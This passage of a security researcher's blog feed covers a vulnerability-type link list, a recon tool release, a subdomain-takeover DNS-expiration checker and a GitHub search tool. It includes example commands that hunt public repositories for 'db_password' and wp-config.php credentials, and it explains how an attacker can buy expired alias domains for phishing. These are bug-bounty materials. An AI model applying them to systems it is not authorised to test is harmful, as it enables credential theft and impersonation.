+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200321_javascriptinjectionreflecteddombased&quot; target=&quot;_blank&quot;&gt;JavaScript injection (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200322_javascriptinjectionstoreddombased&quot; target=&quot;_blank&quot;&gt;JavaScript injection (stored DOM-based)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200370_clientsidejsoninjectiondombased&quot; target=&quot;_blank&quot;&gt;Client-side JSON injection (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200371_clientsidejsoninjectionreflecteddombased&quot; target=&quot;_blank&quot;&gt;Client-side JSON injection (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200372_clientsidejsoninjectionstoreddombased&quot; target=&quot;_blank&quot;&gt;Client-side JSON injection (stored DOM-based)&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;xml-manipulation&quot;&gt;XML manipulation&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100700_xmlinjection&quot; target=&quot;_blank&quot;&gt;XML injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100400_xmlexternalentityinjection&quot; target=&quot;_blank&quot;&gt;XML external entity injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100600_xpathinjection&quot; target=&quot;_blank&quot;&gt;XPath injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200360_clientsidexpathinjectiondombased&quot; target=&quot;_blank&quot;&gt;Client-side XPath injection (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200361_clientsidexpathinjectionreflecteddombased&quot; target=&quot;_blank&quot;&gt;Client-side XPath injection (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200362_clientsidexpathinjectionstoreddombased&quot; target=&quot;_blank&quot;&gt;Client-side XPath injection (stored DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400700_xmlentityexpansion&quot; target=&quot;_blank&quot;&gt;XML entity expansion&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;http-method&quot;&gt;HTTP method&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100900_httpputmethodisenabled&quot; target=&quot;_blank&quot;&gt;HTTP PUT method is enabled&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500a00_httptracemethodisenabled&quot; target=&quot;_blank&quot;&gt;HTTP TRACE method is enabled&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;html5&quot;&gt;HTML5&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500e00_html5webmessagemanipulationdombased&quot; target=&quot;_blank&quot;&gt;HTML5 web message manipulation (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500e01_html5webmessagemanipulationreflecteddombased&quot; target=&quot;_blank&quot;&gt;HTML5 web message manipulation (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500e02_html5webmessagemanipulationstoreddombased&quot; target=&quot;_blank&quot;&gt;HTML5 web message manipulation (stored DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500f00_html5storagemanipulationdombased&quot; target=&quot;_blank&quot;&gt;HTML5 storage manipulation (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500f01_html5storagemanipulationreflecteddombased&quot; target=&quot;_blank&quot;&gt;HTML5 storage manipulation (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500f02_html5storagemanipulationstoreddombased&quot; target=&quot;_blank&quot;&gt;HTML5 storage manipulation (stored DOM-based)&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;information-exposure&quot;&gt;Information exposure&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100280_aspnettracingenabled&quot; target=&quot;_blank&quot;&gt;ASP.NET tracing enabled&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100800_aspnetdebuggingenabled&quot; target=&quot;_blank&quot;&gt;ASP.NET debugging enabled&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400600_aspnetviewstatewithoutmacenabled&quot; target=&quot;_blank&quot;&gt;ASP.NET ViewState without MAC enabled&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00600200_emailaddressesdisclosed&quot; target=&quot;_blank&quot;&gt;Email addresses disclosed&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00600300_privateipaddressesdisclosed&quot; target=&quot;_blank&quot;&gt;Private IP addresses disclosed&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00600550_privatekeydisclosed&quot; target=&quot;_blank&quot;&gt;Private key disclosed&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00600080_databaseconnectionstringdisclosed&quot; target=&quot;_blank&quot;&gt;Database connection string disclosed&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/006000b0_sourcecodedisclosure&quot; target=&quot;_blank&quot;&gt;Source code disclosure&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00600100_directorylisting&quot; target=&quot;_blank&quot;&gt;Directory listing&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;file-path-manipulation&quot;&gt;File path manipulation&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100300_filepathtraversal&quot; target=&quot;_blank&quot;&gt;File path traversal&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100b00_filepathmanipulation&quot; target=&quot;_blank&quot;&gt;File path manipulation&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200350_localfilepathmanipulationdombased&quot; target=&quot;_blank&quot;&gt;Local file path manipulation (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200351_localfilepathmanipulationreflecteddombased&quot; target=&quot;_blank&quot;&gt;Local file path manipulation (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200352_localfilepathmanipulationstoreddombased&quot; target=&quot;_blank&quot;&gt;Local file path manipulation (stored DOM-based)&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;password-related&quot;&gt;Password related&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00300100_cleartextsubmissionofpassword&quot; target=&quot;_blank&quot;&gt;Cleartext submission of password&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400200_passwordreturnedinlaterresponse&quot; target=&quot;_blank&quot;&gt;Password returned in later response&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400300_passwordsubmittedusinggetmethod&quot; target=&quot;_blank&quot;&gt;Password submitted using GET method&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400400_passwordreturnedinurlquerystring&quot; target=&quot;_blank&quot;&gt;Password returned in URL query string&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500800_passwordfieldwithautocompleteenabled&quot; target=&quot;_blank&quot;&gt;Password field with autocomplete enabled&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500900_passwordvaluesetincookie&quot; target=&quot;_blank&quot;&gt;Password value set in cookie&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ddos&quot;&gt;DDOS&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500d00_denialofservicedombased&quot; target=&quot;_blank&quot;&gt;Denial of service (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500d01_denialofservicereflecteddombased&quot; target=&quot;_blank&quot;&gt;Denial of service (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500d02_denialofservicestoreddombased&quot; target=&quot;_blank&quot;&gt;Denial of service (stored DOM-based)&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;others&quot;&gt;Others&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100a00_outofbandresourceloadhttp&quot; target=&quot;_blank&quot;&gt;Out-of-band resource load (HTTP)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200340_websockethijackingdombased&quot; target=&quot;_blank&quot;&gt;WebSocket hijacking (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200341_websockethijackingreflecteddombased&quot; target=&quot;_blank&quot;&gt;WebSocket hijacking (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200342_websockethijackingstoreddombased&quot; target=&quot;_blank&quot;&gt;WebSocket hijacking (stored DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100500_ldapinjection&quot; target=&quot;_blank&quot;&gt;LDAP injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200800_smtpheaderinjection&quot; target=&quot;_blank&quot;&gt;SMTP header injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100100_oscommandinjection&quot; target=&quot;_blank&quot;&gt;Os command injection&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200400_flashcrossdomainpolicy&quot; target=&quot;_blank&quot;&gt;Flash cross-domain policy&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200500_silverlightcrossdomainpolicy&quot; target=&quot;_blank&quot;&gt;Silverlight cross-domain policy&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00300200_externalserviceinteractiondns&quot; target=&quot;_blank&quot;&gt;External service interaction (DNS)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00300210_externalserviceinteractionhttp&quot; target=&quot;_blank&quot;&gt;External service interaction (HTTP)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00300220_externalserviceinteractionsmtp&quot; target=&quot;_blank&quot;&gt;External service interaction (SMTP)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400500_crossdomainpost&quot; target=&quot;_blank&quot;&gt;Cross-domain POST&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400b00_inputreturnedinresponsestored&quot; target=&quot;_blank&quot;&gt;Input returned in response (stored)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400c00_inputreturnedinresponsereflected&quot; target=&quot;_blank&quot;&gt;Input returned in response (reflected)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400d00_suspiciousinputtransformationreflected&quot; target=&quot;_blank&quot;&gt;Suspicious input transformation (reflected)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400e00_suspiciousinputtransformationstored&quot; target=&quot;_blank&quot;&gt;Suspicious input transformation (stored)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500400_crossdomainrefererleakage&quot; target=&quot;_blank&quot;&gt;Cross-domain Referer leakage&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500500_crossdomainscriptinclude&quot; target=&quot;_blank&quot;&gt;Cross-domain script include&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500700_sessiontokeninurl&quot; target=&quot;_blank&quot;&gt;Session token in URL&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500980_fileuploadfunctionality&quot; target=&quot;_blank&quot;&gt;File upload functionality&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400800_longredirectionresponse&quot; target=&quot;_blank&quot;&gt;Long redirection response&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500100_openredirection&quot; target=&quot;_blank&quot;&gt;Open redirection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500110_openredirectiondombased&quot; target=&quot;_blank&quot;&gt;Open redirection (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500111_openredirectionreflecteddombased&quot; target=&quot;_blank&quot;&gt;Open redirection (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500112_openredirectionstoreddombased&quot; target=&quot;_blank&quot;&gt;Open redirection (stored DOM-based)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00501000_linkmanipulationdombased&quot; target=&quot;_blank&quot;&gt;Link manipulation (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00501001_linkmanipulationreflecteddombased&quot; target=&quot;_blank&quot;&gt;Link manipulation (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00501002_linkmanipulationstoreddombased&quot; target=&quot;_blank&quot;&gt;Link manipulation (stored DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00501100_documentdomainmanipulationdombased&quot; target=&quot;_blank&quot;&gt;Document domain manipulation (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00501101_documentdomainmanipulationreflecteddombased&quot; target=&quot;_blank&quot;&gt;Document domain manipulation (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00501102_documentdomainmanipulationstoreddombased&quot; target=&quot;_blank&quot;&gt;Document domain manipulation (stored DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00501200_domdatamanipulationdombased&quot; target=&quot;_blank&quot;&gt;DOM data manipulation (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00501201_domdatamanipulationreflecteddombased&quot; target=&quot;_blank&quot;&gt;DOM data manipulation (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00501202_domdatamanipulationstoreddombased&quot; target=&quot;_blank&quot;&gt;DOM data manipulation (stored DOM-based)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00800200_htmldoesnotspecifycharset&quot; target=&quot;_blank&quot;&gt;HTML does not specify charset&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00800300_htmlusesunrecognizedcharset&quot; target=&quot;_blank&quot;&gt;HTML uses unrecognized charset&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/01000100_sslcertificate&quot; target=&quot;_blank&quot;&gt;SSL certificate&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/01000200_unencryptedcommunications&quot; target=&quot;_blank&quot;&gt;Unencrypted communications&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/01000300_stricttransportsecuritynotenforced&quot; target=&quot;_blank&quot;&gt;Strict transport security not enforced&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/01000400_mixedcontent&quot; target=&quot;_blank&quot;&gt;Mixed content&lt;/a&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/vulnerabilities-list/&quot;&gt;Vulnerabilities list&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on April 05, 2017.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Actarus code release]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/actarus-code-release/" />
+  <id>http://10degres.net/actarus-code-release</id>
+  <published>2017-03-20T00:00:00+00:00</published>
+  <updated>2017-03-20T00:00:00+00:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;Actarus is a custom tool that can perform automatic recon and store all datas in a database. 
+Afterwards you could consult/search keywords in it to find vulnerabilities or at least entry points.&lt;/p&gt;
+
+&lt;p&gt;After some months of inactivity, I finally decided to publicly release the source code of Actarus.
+I started this project to learn Symfony, now I hate it. Maybe someone will give him another chance to grow up.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;Below a quick list of Actarus features:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;project managment&lt;/li&gt;
+  &lt;li&gt;server managment&lt;/li&gt;
+  &lt;li&gt;domain managment&lt;/li&gt;
+  &lt;li&gt;host (subdomain) managment&lt;/li&gt;
+  &lt;li&gt;task managment, priority, autokill&lt;/li&gt;
+  &lt;li&gt;automatic recon&lt;/li&gt;
+  &lt;li&gt;result interpretation and callback&lt;/li&gt;
+  &lt;li&gt;alert managment and automatic generation&lt;/li&gt;
+  &lt;li&gt;technology managment and gathering&lt;/li&gt;
+  &lt;li&gt;multi processing&lt;/li&gt;
+  &lt;li&gt;clustering&lt;/li&gt;
+  &lt;li&gt;HackerOne interaction&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is a video that shows the web gui:
+&lt;a href=&quot;https://www.youtube.com/watch?v=_u1-L0YjI7g&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://10degres.net/images/actarus_video_preview.jpg&quot; alt=&quot;video actarus&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is the git repository.
+https://github.com/gwen001/actarus
+&lt;a href=&quot;https://github.com/gwen001/actarus&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;https://github.com/gwen001/actarus&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;I also created a Virtual machine with VirtualBox for people who want to test the project but not install/configure it (yes, it’s pain in the ass).&lt;br /&gt;
+&lt;a href=&quot;http://10degres.net/assets/actarus.ova&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Download the VM&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;I really think that this tool could help bounty hunters in their daily task.
+I had the opportunity to test it on 3 dedicated servers at the same time and the result was awesome.
+30 task paralellized for 1 week, nights and days, the amount of data collected was huge but because of the interpreter and the search engines, it’s pretty easy to extract Wordpress install, svn repositories, directory listing or whatever you are looking for.&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/actarus-code-release/&quot;&gt;Actarus code release&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on March 20, 2017.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Subdomain takeover - DNS expiration]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/subdomain-takeover-dns-expiration/" />
+  <id>http://10degres.net/subdomain-takeover-dns-expiration</id>
+  <published>2016-10-12T00:00:00+01:00</published>
+  <updated>2016-10-12T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;One quick and easy way to make cash in bug bounty job is subdomain takeover.
+The goal is to steal a forgetted/unused subdomain of your target and put a PoC in place.
+If you are able to do that, that means that instead of a plain text file, an attacker could replicate the true site of the victim and perform phishing.
+This way he could trick users and even the employees of the company to grab useful data like credentials, this can also have really huge impact on the companies reputation.&lt;/p&gt;
+
+&lt;p&gt;First of all you have to find a list of subdomains of your target.
+To perform that task, you can use a single tool like &lt;a href=&quot;/theharvester/&quot;&gt;TheHarvester&lt;/a&gt; or &lt;a href=&quot;https://github.com/darkoperator/dnsrecon&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;DNSRecon&lt;/a&gt;.
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;Then for each subdomains you should check if it is an alias or not, I personnally use the command &lt;code class=&quot;highlighter-rouge&quot;&gt;host&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ host rencontres.leparisien.fr
+rencontres.leparisien.fr is an alias for www.pointscommuns.com.
+www.pointscommuns.com has address 217.70.188.38
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;if yes, and if the alias destination is an external domain, then you should check his expiry date of this domain.
+Because if this domain has expired, that means an attacker could buy it through a registrar like Gandi for a small amount.
+Then put a fake look alike website in place and finally start social engineering by impersonating the vulnerable company.&lt;/p&gt;
+
+&lt;p&gt;To perform all those tests, I wrote a PHP script that takes a subdomains list as an argument.
+Usage is:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Usage: php dnsexpire.php [OPTIONS] -f &amp;lt;subdomain|input file&amp;gt;
+
+Options:
+    -a  set alert for result output, default=30 days
+    -f  subdomains list source file
+    -h  print this help
+
+Examples:
+    php dnsexpire.php -f example.com
+    php dnsexpire.php -a 10 -f dns.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Output is:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/dnsexpire-example.jpg&quot;&gt;&lt;img src=&quot;/images/dnsexpire-example.jpg&quot; alt=&quot;DNS expiration PHP tool&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The code is available on my &lt;a href=&quot;https://github.com/gwen001/dnsexpire&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;GitHub repository&lt;/a&gt; so give it a try!&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/subdomain-takeover-dns-expiration/&quot;&gt;Subdomain takeover - DNS expiration&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on October 12, 2016.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[GitHub search]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/github-search/" />
+  <id>http://10degres.net/github-search</id>
+  <published>2016-09-06T00:00:00+01:00</published>
+  <updated>2016-09-06T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;We all know the famous quote “&lt;em&gt;Think out of the box&lt;/em&gt;”.
+Technical knowledge is important but creativity is also.
+In bug bounty, to get nice rewards, sometimes you don’t need to be a crazy coder or great network engineer, you simply need to try what other didn’t.&lt;/p&gt;
+
+&lt;p&gt;This year, Slack get in trouble because many developers leave their credentials in their public repository.
+Last year Uber had to deal with a major security issue: database keys were stored in GitHub (this leads to a sweet bounty for the finder).&lt;/p&gt;
+
+&lt;p&gt;I found an interesting project, on GitHub itself, to parse the search engine results: &lt;a href=&quot;https://github.com/melvinsh/vcsmap&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;vcsmap from Melvinsh&lt;/a&gt;.
+Unfortunately the scrapper seems to have trouble with search that required authentication.
+Since I don’t understand Ruby, I wrote my own tool with PHP.
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;The code is available on my &lt;a href=&quot;https://github.com/gwen001/github-search&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;GitHub repository&lt;/a&gt; and for sure, you can tweak it to fit your needs.
+Usage is:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Usage: php github-search.php [OPTIONS]
+
+Options:
+    -c  set cookie session
+    -e	file extension filter
+    -f  looking for file
+    -h  print this help
+    -o  provide organization name
+    -r  maximum number of results, default 50
+    -s  search string
+
+Examples:
+    php github-search.php -o myorganization -s db_password
+    php github-search.php -o myorganization -f wp-config.php -s db_password
+    php github-search.php -c &quot;user_session=B0KqycP8LlYORc-s3WFZoH71TG&quot; -f wp-config -e php -r 1000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;An organization name must be provided when you are not authenticated on GitHub, that why the cookie option exists, of course you should use your own cookie value. And here is the output:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/github-search-example.png&quot;&gt;&lt;img src=&quot;/images/github-search-example.png&quot; alt=&quot;GitHub search PHP tool&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The following fields are displayed:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;repository: name of the repository where the file/string has been found&lt;/li&gt;
+  &lt;li&gt;file: name of the file found or where the string has been found&lt;/li&gt;
+  &lt;li&gt;language: the estimated language used in the file&lt;/li&gt;
+  &lt;li&gt;summary: the lines where the string has been found with their number&lt;/li&gt;
+  &lt;li&gt;link: direct link to the concerned file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Give it a try and let me know if you find a bug!&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/github-search/&quot;&gt;GitHub search&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on September 06, 2016.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Image Gallery SQL Injection]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/image-gallery-sql-injection/" />
+  <id>http://10degres.net/image-gallery-sql-injection</id>
+  <published>2016-05-20T00:00:00+01:00</published>
+  <updated>2016-05-20T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;While I was working on a famous bug bounty program, WPScan returns me the list of the plugins configured on the Wordpress install.
+Here is what I found in one of them: &lt;a href=&quot;https://wordpress.org/plugins/gallery-images/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Image Gallery by Huge-IT&lt;/a&gt;.&lt;/p&gt;
+
